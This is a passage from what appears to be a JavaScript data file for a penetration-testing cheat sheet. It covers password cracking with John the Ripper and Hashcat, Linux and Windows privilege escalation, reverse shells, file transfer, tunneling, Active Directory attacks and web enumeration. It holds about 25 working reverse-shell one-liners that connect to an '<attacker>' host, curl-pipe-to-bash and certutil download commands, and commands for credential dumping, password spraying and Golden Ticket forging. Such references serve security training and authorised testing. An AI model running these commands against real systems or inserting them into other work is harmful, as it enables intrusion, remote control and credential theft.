        cmd: "john --show hashes.txt",
        desc: "Display previously cracked passwords",
      },
      {
        cmd: "john --list=formats",
        desc: "List all supported hash formats",
      },
      {
        cmd: "john --incremental hashes.txt",
        desc: "Brute-force using incremental (all character combinations) mode",
      },
      {
        cmd: "john --rules --wordlist=rockyou.txt hashes.txt",
        desc: "Apply word mangling rules to the wordlist",
      },
      {
        cmd: "john --single hashes.txt",
        desc: "Use single crack mode (based on username/GECOS info)",
      },
      {
        cmd: "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
        desc: "Combine passwd and shadow files for John",
      },
      {
        cmd: "john --wordlist=rockyou.txt unshadowed.txt",
        desc: "Crack Linux user passwords from unshadowed file",
      },
      {
        cmd: "zip2john protected.zip > zip_hash.txt",
        desc: "Extract hash from a password-protected ZIP file",
      },
      {
        cmd: "rar2john protected.rar > rar_hash.txt",
        desc: "Extract hash from a password-protected RAR file",
      },
      {
        cmd: "pdf2john protected.pdf > pdf_hash.txt",
        desc: "Extract hash from a password-protected PDF file",
      },
      {
        cmd: "ssh2john id_rsa > ssh_hash.txt",
        desc: "Extract hash from a passphrase-protected SSH private key",
      },
      {
        cmd: "keepass2john database.kdbx > keepass_hash.txt",
        desc: "Extract hash from a KeePass database file",
      },
      {
        cmd: "john --fork=4 --wordlist=rockyou.txt hashes.txt",
        desc: "Use 4 CPU cores for parallel cracking",
      },
      {
        cmd: "john --restore",
        desc: "Resume a previously interrupted cracking session",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 10. Hashcat  (25 commands)
  // ---------------------------------------------------------------
  {
    cat: "Password Cracking",
    title: "Hashcat",
    items: [
      {
        cmd: "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
        desc: "Crack MD5 hashes with a wordlist (mode 0 = MD5)",
      },
      {
        cmd: "hashcat -m 100 hashes.txt rockyou.txt",
        desc: "Crack SHA-1 hashes (mode 100)",
      },
      {
        cmd: "hashcat -m 1400 hashes.txt rockyou.txt",
        desc: "Crack SHA-256 hashes (mode 1400)",
      },
      {
        cmd: "hashcat -m 1800 hashes.txt rockyou.txt",
        desc: "Crack SHA-512crypt hashes -- Linux /etc/shadow (mode 1800)",
      },
      {
        cmd: "hashcat -m 1000 hashes.txt rockyou.txt",
        desc: "Crack NTLM hashes (mode 1000)",
      },
      {
        cmd: "hashcat -m 5600 hashes.txt rockyou.txt",
        desc: "Crack NTLMv2 hashes (mode 5600)",
      },
      {
        cmd: "hashcat -m 3200 hashes.txt rockyou.txt",
        desc: "Crack bcrypt hashes (mode 3200)",
      },
      {
        cmd: "hashcat -m 500 hashes.txt rockyou.txt",
        desc: "Crack MD5crypt hashes -- $1$ prefix (mode 500)",
      },
      {
        cmd: "hashcat -m 13100 hashes.txt rockyou.txt",
        desc: "Crack Kerberoasted TGS hashes (mode 13100)",
      },
      {
        cmd: "hashcat -m 18200 hashes.txt rockyou.txt",
        desc: "Crack AS-REP roasted hashes (mode 18200)",
      },
      {
        cmd: "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a",
        desc: "Brute-force MD5 with mask attack (6-char, all characters)",
      },
      {
        cmd: "hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d",
        desc: "Brute-force MD5 with mask -- digits only (6 digits)",
      },
      {
        cmd: "hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt rockyou.txt",
        desc: "Wordlist attack with best64 rule file for mangling",
      },
      {
        cmd: "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt",
        desc: "Combinator attack -- combine words from two wordlists",
      },
      {
        cmd: "hashcat -m 0 hashes.txt rockyou.txt --show",
        desc: "Show already-cracked hashes from the potfile",
      },
      {
        cmd: "hashcat -m 0 hashes.txt rockyou.txt --username",
        desc: "Handle hash file that includes usernames (user:hash format)",
      },
      {
        cmd: "hashcat -m 0 hashes.txt rockyou.txt -o cracked.txt",
        desc: "Write cracked results to an output file",
      },
      {
        cmd: "hashcat -m 2500 handshake.hccapx rockyou.txt",
        desc: "Crack WPA/WPA2 handshake captures",
      },
      {
        cmd: "hashcat -m 22000 handshake.hc22000 rockyou.txt",
        desc: "Crack WPA/WPA2 with modern PMKID/EAPOL format",
      },
      {
        cmd: "hashcat --force -m 0 hashes.txt rockyou.txt",
        desc: "Force hashcat to run even without proper GPU drivers",
      },
      {
        cmd: "hashcat -m 0 hashes.txt rockyou.txt -w 3",
        desc: "Set workload profile to high (3) for maximum GPU usage",
      },
      {
        cmd: "hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d",
        desc: "Hybrid attack: wordlist + append 3-digit mask",
      },
      {
        cmd: "hashcat -m 0 -a 7 hashes.txt ?d?d?d rockyou.txt",
        desc: "Hybrid attack: prepend 3-digit mask + wordlist",
      },
      {
        cmd: "hashcat --benchmark",
        desc: "Benchmark all hash modes to see GPU cracking speed",
      },
      {
        cmd: "hashcat -m 0 hashes.txt rockyou.txt --session=mysession --restore",
        desc: "Restore a previously interrupted cracking session",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 11. Linux Privilege Escalation  (30 commands)
  // ---------------------------------------------------------------
  {
    cat: "Privilege Escalation",
    title: "Linux Privilege Escalation",
    items: [
      {
        cmd: "id",
        desc: "Show current user ID, group memberships, and context",
      },
      {
        cmd: "whoami",
        desc: "Print the current effective username",
      },
      {
        cmd: "uname -a",
        desc: "Display kernel version and system architecture",
      },
      {
        cmd: "cat /etc/os-release",
        desc: "Identify the Linux distribution and version",
      },
      {
        cmd: "cat /etc/passwd",
        desc: "List all user accounts on the system",
      },
      {
        cmd: "cat /etc/shadow",
        desc: "Read password hashes (requires root or readable permissions)",
      },
      {
        cmd: "cat /etc/crontab",
        desc: "View system-wide crontab for scheduled tasks",
      },
      {
        cmd: "ls -la /etc/cron.d/",
        desc: "List cron job configuration files",
      },
      {
        cmd: "crontab -l",
        desc: "List cron jobs for the current user",
      },
      {
        cmd: "sudo -l",
        desc: "List commands the current user can run with sudo",
      },
      {
        cmd: "find / -perm -4000 -type f 2>/dev/null",
        desc: "Find all SUID binaries on the system",
      },
      {
        cmd: "find / -perm -2000 -type f 2>/dev/null",
        desc: "Find all SGID binaries on the system",
      },
      {
        cmd: "find / -writable -type d 2>/dev/null",
        desc: "Find all world-writable directories",
      },
      {
        cmd: "find / -writable -type f 2>/dev/null",
        desc: "Find all world-writable files",
      },
      {
        cmd: "find / -name '*.py' -writable 2>/dev/null",
        desc: "Find writable Python scripts (potential hijack targets)",
      },
      {
        cmd: "getcap -r / 2>/dev/null",
        desc: "List all binaries with Linux capabilities set",
      },
      {
        cmd: "ls -la /tmp /var/tmp /dev/shm",
        desc: "Check world-writable temp directories for artifacts",
      },
      {
        cmd: "env",
        desc: "Display all environment variables (look for credentials/paths)",
      },
      {
        cmd: "echo $PATH",
        desc: "Show the PATH variable (check for writable directories)",
      },
      {
        cmd: "ps aux",
        desc: "List all running processes with user context",
      },
      {
        cmd: "ps aux | grep root",
        desc: "Find processes running as root",
      },
      {
        cmd: "netstat -tulnp 2>/dev/null || ss -tulnp",
        desc: "Show listening ports and associated services",
      },
      {
        cmd: "ip addr show",
        desc: "Display network interface configuration",
      },
      {
        cmd: "cat /etc/exports",
        desc: "Check NFS exports for no_root_squash (NFS privesc)",
      },
      {
        cmd: "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null",
        desc: "List installed packages (look for vulnerable versions)",
      },
      {
        cmd: "find / -name 'authorized_keys' 2>/dev/null",
        desc: "Find SSH authorized_keys files",
      },
      {
        cmd: "find / -name 'id_rsa' 2>/dev/null",
        desc: "Find SSH private keys on the filesystem",
      },
      {
        cmd: "ls -la /home/",
        desc: "List home directories and permissions",
      },
      {
        cmd: "cat /proc/version",
        desc: "Display kernel version for exploit research",
      },
      {
        cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        desc: "Upgrade a dumb shell to a fully interactive TTY",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 12. Windows Privilege Escalation  (30 commands)
  // ---------------------------------------------------------------
  {
    cat: "Privilege Escalation",
    title: "Windows Privilege Escalation",
    items: [
      {
        cmd: "whoami",
        desc: "Display current username",
      },
      {
        cmd: "whoami /priv",
        desc: "Show privileges assigned to the current user token",
      },
      {
        cmd: "whoami /groups",
        desc: "Show group memberships for the current user",
      },
      {
        cmd: "net user",
        desc: "List all local user accounts",
      },
      {
        cmd: "net user <username>",
        desc: "Show detailed info for a specific user",
        example: "net user Administrator",
      },
      {
        cmd: "net localgroup administrators",
        desc: "List members of the local Administrators group",
      },
      {
        cmd: "systeminfo",
        desc: "Display detailed system configuration (OS version, patches)",
      },
      {
        cmd: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Hotfix\"",
        desc: "Extract OS version and installed hotfixes",
      },
      {
        cmd: "wmic qfe list brief",
        desc: "List installed patches and hotfixes",
      },
      {
        cmd: "wmic product get name,version",
        desc: "List installed software and versions",
      },
      {
        cmd: "tasklist /SVC",
        desc: "List running processes and their associated services",
      },
      {
        cmd: "sc query state= all",
        desc: "List all Windows services and their state",
      },
      {
        cmd: "sc qc <service>",
        desc: "Query configuration of a specific service",
        example: "sc qc vulnerable_service",
      },
      {
        cmd: "icacls \"C:\\Program Files\\<service_path>\"",
        desc: "Check file permissions on a service binary",
      },
      {
        cmd: "accesschk.exe /accepteula -uwcqv \"Everyone\" *",
        desc: "Find services writable by Everyone (SysInternals)",
      },
      {
        cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        desc: "Check if AlwaysInstallElevated is enabled (MSI privesc)",
      },
      {
        cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        desc: "Check AlwaysInstallElevated in user registry hive",
      },
      {
        cmd: "cmdkey /list",
        desc: "List stored Windows credentials",
      },
      {
        cmd: "dir /s /b C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.cfg 2>nul",
        desc: "Search user directories for configuration files",
      },
      {
        cmd: "type C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        desc: "Read PowerShell command history for credentials",
      },
      {
        cmd: "netsh advfirewall show allprofiles",
        desc: "Show firewall status for all profiles",
      },
      {
        cmd: "schtasks /query /fo TABLE /nh",
        desc: "List all scheduled tasks",
      },
      {
        cmd: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\"",
        desc: "Find unquoted service paths for privilege escalation",
      },
      {
        cmd: "reg query HKLM /f password /t REG_SZ /s",
        desc: "Search the registry for stored passwords",
      },
      {
        cmd: "dir C:\\ /s /b | findstr /i \"unattend.xml sysprep.inf\"",
        desc: "Find unattended install files with potential credentials",
      },
      {
        cmd: "powershell -c \"Get-ChildItem -Path C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'\"",
        desc: "Search all files for the string 'password'",
      },
      {
        cmd: "netstat -ano",
        desc: "Show all network connections with process IDs",
      },
      {
        cmd: "ipconfig /all",
        desc: "Display full network configuration",
      },
      {
        cmd: "route print",
        desc: "Display the routing table",
      },
      {
        cmd: "arp -a",
        desc: "Display the ARP cache (discover neighboring hosts)",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 13. Reverse Shells  (25 one-liners)
  // ---------------------------------------------------------------
  {
    cat: "Exploitation",
    title: "Reverse Shells",
    items: [
      {
        cmd: "bash -i >& /dev/tcp/<attacker>/<port> 0>&1",
        desc: "Bash TCP reverse shell",
        example: "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
      },
      {
        cmd: "bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'",
        desc: "Bash reverse shell wrapped in bash -c (for command injection)",
      },
      {
        cmd: "sh -i >& /dev/tcp/<attacker>/<port> 0>&1",
        desc: "POSIX sh reverse shell (when bash is not available)",
      },
      {
        cmd: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> <port> > /tmp/f",
        desc: "Netcat reverse shell using a named pipe (FIFO)",
      },
      {
        cmd: "nc -e /bin/bash <attacker> <port>",
        desc: "Netcat reverse shell with -e flag (traditional netcat)",
      },
      {
        cmd: "ncat <attacker> <port> -e /bin/bash",
        desc: "Ncat reverse shell (Nmap's netcat with -e support)",
      },
      {
        cmd: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        desc: "Python 2 reverse shell one-liner",
      },
      {
        cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        desc: "Python 3 reverse shell one-liner",
      },
      {
        cmd: "php -r '$sock=fsockopen(\"<attacker>\",<port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        desc: "PHP reverse shell one-liner",
      },
      {
        cmd: "perl -e 'use Socket;$i=\"<attacker>\";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        desc: "Perl reverse shell one-liner",
      },
      {
        cmd: "ruby -rsocket -e 'f=TCPSocket.open(\"<attacker>\",<port>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        desc: "Ruby reverse shell one-liner",
      },
      {
        cmd: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<attacker>','<port>');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        desc: "Lua reverse shell one-liner",
      },
      {
        cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<attacker>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}\"",
        desc: "PowerShell reverse shell (Windows)",
      },
      {
        cmd: "powershell -e <base64_encoded_payload>",
        desc: "PowerShell reverse shell via Base64-encoded command",
      },
      {
        cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:<port>",
        desc: "Socat reverse shell with full TTY support",
      },
      {
        cmd: "socat tcp-listen:<port>,reuseaddr,fork exec:bash,pty,stderr,setsid,sigint,sane",
        desc: "Socat bind shell listener with full TTY",
      },
      {
        cmd: "awk 'BEGIN {s=\"/inet/tcp/0/<attacker>/<port>\";while(42){do{printf \"$ \" |& s;s |& getline c;if(c){while((c |& getline) > 0) print $0 |& s;close(c)}} while(c != \"exit\") close(s)}}'",
        desc: "AWK reverse shell",
      },
      {
        cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war",
        desc: "Generate a JSP reverse shell WAR file for Tomcat",
      },
      {
        cmd: "xterm -display <attacker>:1",
        desc: "X11 reverse shell -- connect xterm to attacker's X server",
      },
      {
        cmd: "0<&196;exec 196<>/dev/tcp/<attacker>/<port>; sh <&196 >&196 2>&196",
        desc: "Bash reverse shell using file descriptor 196",
      },
      {
        cmd: "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(<port>,\"<attacker>\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'",
        desc: "Node.js reverse shell one-liner",
      },
      {
        cmd: "groovy -e 'String host=\"<attacker>\";int port=<port>;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();'",
        desc: "Groovy reverse shell one-liner (Java platforms)",
      },
      {
        cmd: "openssl s_client -quiet -connect <attacker>:<port> | /bin/bash | openssl s_client -quiet -connect <attacker>:<port2>",
        desc: "OpenSSL encrypted reverse shell (two-channel)",
      },
      {
        cmd: "import('child_process').then(m=>m.execSync('/bin/bash -c \"bash -i >& /dev/tcp/<attacker>/<port> 0>&1\"'))",
        desc: "Deno/Node ESM reverse shell via dynamic import",
      },
      {
        cmd: "telnet <attacker> <port> | /bin/bash | telnet <attacker> <port2>",
        desc: "Telnet-based reverse shell using two connections (stdin/stdout split)",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 14. File Transfer Methods  (20 techniques)
  // ---------------------------------------------------------------
  {
    cat: "Post-Exploitation",
    title: "File Transfer Methods",
    items: [
      {
        cmd: "python3 -m http.server 8000",
        desc: "Start a Python HTTP server to serve files from the current directory",
      },
      {
        cmd: "python -m SimpleHTTPServer 8000",
        desc: "Start a Python 2 HTTP server for file serving",
      },
      {
        cmd: "wget http://<attacker>:8000/file.txt -O /tmp/file.txt",
        desc: "Download a file using wget",
      },
      {
        cmd: "curl http://<attacker>:8000/file.txt -o /tmp/file.txt",
        desc: "Download a file using curl",
      },
      {
        cmd: "curl http://<attacker>:8000/file.txt | bash",
        desc: "Download and execute a script via curl (use cautiously)",
      },
      {
        cmd: "certutil -urlcache -f http://<attacker>:8000/file.exe C:\\Temp\\file.exe",
        desc: "Download a file on Windows using certutil",
      },
      {
        cmd: "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://<attacker>:8000/file.exe','C:\\Temp\\file.exe')\"",
        desc: "Download a file on Windows using PowerShell WebClient",
      },
      {
        cmd: "powershell -c \"Invoke-WebRequest -Uri 'http://<attacker>:8000/file.exe' -OutFile 'C:\\Temp\\file.exe'\"",
        desc: "Download a file using PowerShell Invoke-WebRequest",
      },
      {
        cmd: "scp file.txt user@<target>:/tmp/file.txt",
        desc: "Copy a file to a remote host via SCP",
        example: "scp linpeas.sh user@10.10.10.5:/tmp/",
      },
      {
        cmd: "scp user@<target>:/tmp/file.txt ./file.txt",
        desc: "Copy a file from a remote host via SCP",
      },
      {
        cmd: "nc -lvnp 9999 > received.bin",
        desc: "Receive a file via netcat (listener side)",
      },
      {
        cmd: "nc <target> 9999 < file.bin",
        desc: "Send a file via netcat (sender side)",
      },
      {
        cmd: "base64 file.bin | nc <target> 9999",
        desc: "Base64 encode and send a file via netcat",
      },
      {
        cmd: "cat file.bin | base64",
        desc: "Base64 encode a file for manual copy-paste transfer",
      },
      {
        cmd: "echo '<base64_data>' | base64 -d > file.bin",
        desc: "Decode a base64 string back to a binary file",
      },
      {
        cmd: "php -S 0.0.0.0:8000",
        desc: "Start a PHP development server for file hosting",
      },
      {
        cmd: "ruby -run -e httpd . -p 8000",
        desc: "Start a Ruby HTTP server for file hosting",
      },
      {
        cmd: "impacket-smbserver share $(pwd) -smb2support",
        desc: "Start an SMB share for Windows file transfers",
      },
      {
        cmd: "copy \\\\<attacker>\\share\\file.exe C:\\Temp\\file.exe",
        desc: "Copy a file from an SMB share on Windows",
      },
      {
        cmd: "tftp -i <attacker> GET file.exe",
        desc: "Download a file via TFTP on Windows",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 15. Port Forwarding / Tunneling  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Pivoting",
    title: "Port Forwarding / Tunneling",
    items: [
      {
        cmd: "ssh -L 8080:127.0.0.1:80 user@<target>",
        desc: "Local port forward: access target's port 80 via local port 8080",
        example: "ssh -L 8080:127.0.0.1:80 user@10.10.10.5",
      },
      {
        cmd: "ssh -R 8080:127.0.0.1:80 user@<attacker>",
        desc: "Remote port forward: expose local port 80 on attacker's port 8080",
      },
      {
        cmd: "ssh -D 1080 user@<target>",
        desc: "Dynamic SOCKS proxy via SSH (route traffic through target)",
        example: "ssh -D 1080 user@10.10.10.5",
      },
      {
        cmd: "ssh -L 3306:10.10.10.10:3306 user@<pivot>",
        desc: "Forward to a third host through a pivot machine",
        example: "ssh -L 3306:172.16.0.5:3306 user@10.10.10.5",
      },
      {
        cmd: "ssh -N -f -L 8080:127.0.0.1:80 user@<target>",
        desc: "Background SSH tunnel (no shell, just forwarding)",
      },
      {
        cmd: "chisel server -p 8080 --reverse",
        desc: "Start a Chisel server on the attacker (for reverse tunnels)",
      },
      {
        cmd: "chisel client <attacker>:8080 R:8001:127.0.0.1:80",
        desc: "Chisel reverse tunnel: expose target's port 80 on attacker's 8001",
      },
      {
        cmd: "chisel client <attacker>:8080 R:socks",
        desc: "Chisel reverse SOCKS proxy through the target",
      },
      {
        cmd: "socat tcp-listen:8080,reuseaddr,fork tcp:<target>:80",
        desc: "Socat port forward: redirect local port 8080 to target's port 80",
      },
      {
        cmd: "socat tcp-listen:1234,reuseaddr,fork tcp:10.10.10.10:3389",
        desc: "Socat forward to an internal host's RDP port",
      },
      {
        cmd: "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.10",
        desc: "Windows netsh port forward (v4 to v4)",
      },
      {
        cmd: "netsh interface portproxy show all",
        desc: "Show all configured Windows port forwards",
      },
      {
        cmd: "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0",
        desc: "Delete a Windows port forward rule",
      },
      {
        cmd: "plink.exe -ssh -L 8080:127.0.0.1:80 user@<target>",
        desc: "Local port forward using PuTTY's plink on Windows",
      },
      {
        cmd: "proxychains nmap -sT -Pn 10.10.10.10",
        desc: "Run nmap through a SOCKS proxy via proxychains",
      },
      {
        cmd: "proxychains curl http://10.10.10.10",
        desc: "Route curl through a SOCKS proxy via proxychains",
      },
      {
        cmd: "sshuttle -r user@<pivot> 10.10.10.0/24",
        desc: "Create a VPN-like tunnel through an SSH pivot host",
        example: "sshuttle -r user@10.10.10.5 172.16.0.0/24",
      },
      {
        cmd: "ligolo-ng agent -connect <attacker>:11601 -ignore-cert",
        desc: "Ligolo-ng agent on the pivot host to establish a tunnel",
      },
      {
        cmd: "ssh -J user@jump_host user@internal_host",
        desc: "SSH through a jump host (ProxyJump)",
      },
      {
        cmd: "ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@internal",
        desc: "SSH through a SOCKS5 proxy using ncat as ProxyCommand",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 16. Active Directory Attacks  (25 commands)
  // ---------------------------------------------------------------
  {
    cat: "Active Directory",
    title: "Active Directory Attacks",
    items: [
      {
        cmd: "crackmapexec smb <target> -u '' -p '' --shares",
        desc: "Enumerate SMB shares with null session",
        example: "crackmapexec smb 10.10.10.5 -u '' -p '' --shares",
      },
      {
        cmd: "crackmapexec smb <target> -u user -p pass --shares",
        desc: "Enumerate SMB shares with valid credentials",
      },
      {
        cmd: "crackmapexec smb <subnet> -u user -p pass",
        desc: "Spray credentials across a subnet",
        example: "crackmapexec smb 10.10.10.0/24 -u admin -p 'P@ss123'",
      },
      {
        cmd: "crackmapexec smb <target> -u user -p pass --sam",
        desc: "Dump SAM database hashes from a Windows host",
      },
      {
        cmd: "crackmapexec smb <target> -u user -p pass --lsa",
        desc: "Dump LSA secrets from a Windows host",
      },
      {
        cmd: "crackmapexec smb <target> -u user -p pass -x 'whoami'",
        desc: "Execute a command on the target via SMB",
      },
      {
        cmd: "impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc>",
        desc: "AS-REP Roasting -- find accounts without Kerberos preauth",
        example: "impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.10.10.5",
      },
      {
        cmd: "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request",
        desc: "Kerberoasting -- request TGS tickets for service accounts",
        example: "impacket-GetUserSPNs CORP.LOCAL/svc_user:Password1 -dc-ip 10.10.10.5 -request",
      },
      {
        cmd: "impacket-secretsdump <domain>/<user>:<pass>@<dc>",
        desc: "Dump all domain hashes via DCSync (requires DA or replication rights)",
        example: "impacket-secretsdump CORP.LOCAL/admin:Pass@10.10.10.5",
      },
      {
        cmd: "impacket-psexec <domain>/<user>:<pass>@<target>",
        desc: "Get a SYSTEM shell via PsExec over SMB",
        example: "impacket-psexec CORP.LOCAL/admin:Pass@10.10.10.5",
      },
      {
        cmd: "impacket-wmiexec <domain>/<user>:<pass>@<target>",
        desc: "Execute commands via WMI (semi-interactive shell)",
      },
      {
        cmd: "impacket-smbexec <domain>/<user>:<pass>@<target>",
        desc: "Execute commands via SMB service creation",
      },
      {
        cmd: "impacket-atexec <domain>/<user>:<pass>@<target> 'whoami'",
        desc: "Execute a command via Windows Task Scheduler",
      },
      {
        cmd: "bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc> -c all",
        desc: "Collect Active Directory data for BloodHound analysis",
        example: "bloodhound-python -d CORP.LOCAL -u user -p pass -ns 10.10.10.5 -c all",
      },
      {
        cmd: "evil-winrm -i <target> -u <user> -p <pass>",
        desc: "Get a PowerShell shell via WinRM",
        example: "evil-winrm -i 10.10.10.5 -u admin -p 'P@ss123'",
      },
      {
        cmd: "evil-winrm -i <target> -u <user> -H <ntlm_hash>",
        desc: "Pass-the-hash authentication via WinRM",
      },
      {
        cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support",
        desc: "NTLM relay attack -- relay captured hashes to target hosts",
      },
      {
        cmd: "responder -I eth0 -dwP",
        desc: "Start Responder to capture NTLM hashes on the network",
        example: "responder -I eth0 -dwP",
      },
      {
        cmd: "kerbrute userenum --dc <dc> -d <domain> users.txt",
        desc: "Enumerate valid domain usernames via Kerberos",
        example: "kerbrute userenum --dc 10.10.10.5 -d CORP.LOCAL users.txt",
      },
      {
        cmd: "kerbrute passwordspray --dc <dc> -d <domain> users.txt 'Password1'",
        desc: "Spray a single password across domain users",
      },
      {
        cmd: "rpcclient -U '' -N <target>",
        desc: "Connect to RPC with null session for enumeration",
        example: "rpcclient -U '' -N 10.10.10.5",
      },
      {
        cmd: "enum4linux -a <target>",
        desc: "Comprehensive SMB/RPC enumeration of a Windows/Samba host",
        example: "enum4linux -a 10.10.10.5",
      },
      {
        cmd: "ldapsearch -x -H ldap://<dc> -b 'DC=corp,DC=local'",
        desc: "Anonymous LDAP query against a domain controller",
      },
      {
        cmd: "impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> administrator",
        desc: "Forge a Golden Ticket for persistent domain access",
      },
      {
        cmd: "mimikatz 'sekurlsa::logonpasswords' exit",
        desc: "Dump plaintext credentials from memory using Mimikatz",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 17. Web Enumeration  (25 commands)
  // ---------------------------------------------------------------
  {
    cat: "Web Enumeration",
    title: "Web Enumeration",
    items: [
      {
        cmd: "whatweb http://<target>",
        desc: "Identify web technologies, frameworks, and CMS",
        example: "whatweb http://10.10.10.5",
      },
      {
        cmd: "nikto -h http://<target>",
        desc: "Scan for web server misconfigurations and known vulnerabilities",
        example: "nikto -h http://10.10.10.5",
      },
      {
        cmd: "wpscan --url http://<target> --enumerate vp,vt,u",
        desc: "Scan WordPress for vulnerable plugins, themes, and users",
        example: "wpscan --url http://10.10.10.5 --enumerate vp,vt,u",
      },
      {
        cmd: "wpscan --url http://<target> --passwords rockyou.txt --usernames admin",
        desc: "Brute-force WordPress login credentials",
      },
      {
        cmd: "nuclei -u http://<target>",
        desc: "Run Nuclei vulnerability scanner against a target",
        example: "nuclei -u http://10.10.10.5",
      },
      {
        cmd: "nuclei -u http://<target> -t cves/",
        desc: "Scan specifically for known CVEs using Nuclei",
      },
      {
        cmd: "ffuf -u http://<target>/FUZZ -w wordlist.txt",
        desc: "Fuzz web paths using ffuf (fast web fuzzer)",
        example: "ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
      },
      {
        cmd: "ffuf -u http://<target>/FUZZ -w wordlist.txt -fc 404",
        desc: "Fuzz web paths and filter out 404 responses",
      },
      {
        cmd: "ffuf -u http://<target> -H 'Host: FUZZ.target.com' -w subdomains.txt -fc 302",
        desc: "Fuzz for virtual hosts using the Host header",
      },
      {
        cmd: "ffuf -u http://<target>/api/FUZZ -w wordlist.txt -mc 200 -o results.json -of json",
        desc: "Fuzz API endpoints and save results as JSON",
      },
      {
        cmd: "curl -s http://<target>/robots.txt",
        desc: "Check robots.txt for hidden paths and directories",
      },
      {
        cmd: "curl -s http://<target>/sitemap.xml",
        desc: "Check sitemap.xml for site structure and pages",
      },
      {
        cmd: "curl -s -I http://<target>",
        desc: "Fetch HTTP headers to identify server software",
      },
      {
        cmd: "curl -s http://<target>/.git/HEAD",
        desc: "Check for exposed Git repository",
      },
      {
        cmd: "curl -s http://<target>/.env",
        desc: "Check for exposed environment variables file",
      },
      {
        cmd: "curl -s http://<target>/wp-json/wp/v2/users",
        desc: "Enumerate WordPress users via REST API",
      },
      {
        cmd: "subfinder -d <domain> -o subdomains.txt",
        desc: "Discover subdomains using multiple data sources",
        example: "subfinder -d example.com -o subs.txt",
      },
      {
        cmd: "amass enum -d <domain>",
        desc: "Active and passive subdomain enumeration using Amass",
        example: "amass enum -d example.com",
      },
      {
        cmd: "httpx -l subdomains.txt -sc -title -tech-detect",
